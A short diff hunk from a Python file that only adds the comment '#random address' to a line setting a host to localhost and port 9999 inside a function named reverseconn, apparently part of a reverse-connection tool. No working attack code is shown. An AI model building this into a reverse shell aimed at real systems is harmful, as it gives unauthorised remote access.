@@ -50,7 +50,7 @@ def enc(txt):
 
 def reverseconn():
 
-    host=socket.gethostbyname("localhost")
+    host=socket.gethostbyname("localhost") #random address
 
     port=9999
 
